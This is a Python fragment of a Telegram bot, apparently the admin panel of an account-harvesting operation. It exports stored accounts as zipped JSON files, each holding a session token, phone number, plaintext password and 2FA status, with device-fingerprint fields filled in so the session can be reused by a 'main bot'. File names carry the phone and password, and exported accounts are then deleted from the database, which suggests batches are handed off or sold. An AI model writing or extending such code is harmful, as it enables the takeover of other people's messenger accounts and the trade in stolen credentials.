@dp.message(AuthState.waiting_export_count)
async def handle_export_count(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    data = await state.get_data()
    export_type = data.get("export_type")
    all_accounts = data.get("export_accounts", {})
    total = len(all_accounts)
    try:
        count_str = message.text.strip().lower()
        if count_str == "all":
            count = total
        else:
            count = int(count_str)
            if count <= 0:
                await message.answer("❌ Введите число больше 0 или <code>all</code>", parse_mode="HTML")
                return
            if count > total:
                count = total
    except:
        await message.answer("❌ Введите число или <code>all</code>", parse_mode="HTML")
        return
    await state.clear()
    selected = dict(list(all_accounts.items())[:count])
    await export_tokens(message, selected, f"{export_type}_{count}")

async def export_tokens(message_or_callback, accs: dict, prefix: str):
    if isinstance(message_or_callback, types.Message):
        msg = await message_or_callback.answer("⏳ Создаю архив...")
        chat = message_or_callback.chat
    else:
        msg = await message_or_callback.message.answer("⏳ Создаю архив...")
        chat = message_or_callback.message.chat
    try:
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for acc_id, acc in accs.items():
                token = acc.get("token", "")
                phone = acc.get("phone", "")
                password = acc.get("password", "")
                status = acc.get("status", "")
                device_info = acc.get("device_info", {})
                device_id = acc.get("device_id", "")
                
                # Формируем полный JSON для основного бота
                full_data = {
                    "token": token,
                    "deviceType": device_info.get("deviceType", "ANDROID"),
                    "appVersion": device_info.get("appVersion", "26.17.1"),
                    "osVersion": device_info.get("osVersion", "Android 10"),
                    "timezone": device_info.get("timezone", "Europe/Moscow"),
                    "screen": device_info.get("screen", "408dpi 1080x2292"),
                    "pushDeviceType": "GCM",
                    "arch": device_info.get("arch", "arm64-v8a"),
                    "locale": device_info.get("locale", device_info.get("deviceLocale", "ru")),
                    "buildNumber": device_info.get("buildNumber", 6712),
                    "deviceName": device_info.get("deviceName", "Google Pixel 7"),
                    "deviceLocale": device_info.get("deviceLocale", device_info.get("locale", "ru")),
                    "deviceId": device_id,
                    "clientSessionId": int(time.time() * 1000) & 0x7FFFFFFF,
                    "user": {
                        "user_id": 0,
                        "phone": int(phone) if phone and phone.isdigit() else 0,
                        "photo_id": None,
                        "first_name": "",
                        "last_name": ""
                    },
                    "password": password
                }
                
                # Имя файла
                if phone:
                    filename = f"{phone}"
                else:
                    filename = f"{acc_id[:8]}"
                if password:
                    filename += f"_pass_{password}"
                if status == "2fa":
                    filename += "_2FA"
                
                # Сохраняем как JSON
                content = json.dumps(full_data, ensure_ascii=False, indent=2)
                zf.writestr(f"{filename}.json", content)
        
        zip_buffer.seek(0)
        temp_file = f"export_{prefix}_{int(time.time())}.zip"
        with open(temp_file, 'wb') as f:
            f.write(zip_buffer.read())
        await bot.send_document(chat.id, FSInputFile(temp_file), caption=f"💾 {prefix}\n📦 Токенов: {len(accs)}\n🗑 Удалены из базы")
        os.remove(temp_file)
        for acc_id in accs:
            if acc_id in accounts:
                del accounts[acc_id]
        save_data()
        await msg.edit_text(f"✅ Выгружено <b>{len(accs)}</b> токенов\n🗑 Удалены\n📊 Осталось: <b>{len(accounts)}</b>", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Export error: {e}")
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")

